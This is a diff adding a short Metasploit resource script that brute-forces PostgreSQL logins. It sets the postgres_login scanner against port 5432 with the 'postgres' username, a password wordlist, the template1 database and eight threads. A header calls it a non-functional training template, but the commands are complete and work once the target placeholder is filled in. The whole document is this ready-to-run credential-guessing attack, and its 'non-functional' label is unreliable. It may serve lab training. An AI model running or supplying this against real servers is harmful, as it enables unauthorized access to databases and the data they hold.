@@ -1,0 +1,11 @@
+# PostgreSQL Brute Force Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/postgres/postgres_login
+set RHOSTS <TARGET_IP>
+set RPORT 5432
+set USERNAME postgres
+set PASS_FILE /usr/share/wordlists/postgres_passwords.txt
+set DATABASE template1
+set THREADS 8
+run
